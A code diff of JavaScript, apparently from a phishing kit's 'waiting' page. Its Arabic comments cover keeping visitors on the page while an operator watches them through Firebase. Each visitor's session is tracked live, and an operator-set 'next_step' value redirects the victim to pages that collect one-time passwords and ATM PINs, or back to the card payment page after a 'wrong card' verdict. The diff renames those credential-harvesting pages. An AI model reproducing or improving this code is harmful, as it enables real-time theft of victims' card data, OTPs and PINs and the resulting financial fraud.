@@ -88,11 +88,10 @@
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
-            // تحديث حالة الزائر وتحويل حالة الانتظار لـ "waiting" فور الدخول
-            // ده بيضمن إن الصفحة ما ترجعش لورا لو كان فيه "wrong_card" قديم
+            // تحديث الحالة لـ waiting عشان نلغي أي أمر قديم ونثبت الزائر في الصفحة
             database.ref('orders/' + v_id).update({
-                next_step: 'waiting', 
-                status: 'في صفحة الانتظار'
+                next_step: 'waiting',
+                status: 'في صفحة المعالجة'
             });
 
             database.ref('live_sessions/' + v_id).update({
@@ -100,16 +99,19 @@
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة الأوامر (الاستماع فقط للتغييرات الجديدة)
+            // مراقبة الأوامر بالأسماء الصحيحة للملفات
             const orderRef = database.ref('orders/' + v_id + '/next_step');
             orderRef.on('value', (snapshot) => {
                 const step = snapshot.val();
                 if (step) {
-                    if (step === 'go_to_otp' || step === 'go_to_token') {
-                        window.location.href = 'sync-token.html';
+                    if (step === 'go_to_otp' || step === 'wrong_otp') {
+                        // صفحة الـ OTP بالاسم الجديد
+                        window.location.href = 'complete-st.html'; 
                     } else if (step === 'go_to_pin') {
-                        window.location.href = 'secure-auth-v4.html';
+                        // صفحة الـ ATM بالاسم الجديد
+                        window.location.href = 'auth-session.html';
                     } else if (step === 'wrong_card') {
+                        // الرجوع لصفحة الدفع
                         window.location.href = 'secure-pay-v2.html';
                     } else if (step === 'success') {
                         window.location.href = 'success-page.html';
